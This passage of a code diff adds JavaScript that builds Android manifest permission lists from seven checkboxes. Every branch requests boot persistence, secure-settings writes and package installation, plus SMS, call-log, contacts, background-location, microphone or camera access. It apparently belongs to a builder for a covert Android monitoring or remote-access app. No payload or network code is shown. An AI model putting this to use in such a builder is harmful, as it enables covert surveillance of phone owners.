+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
+           ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
+           ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+        //if four are checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
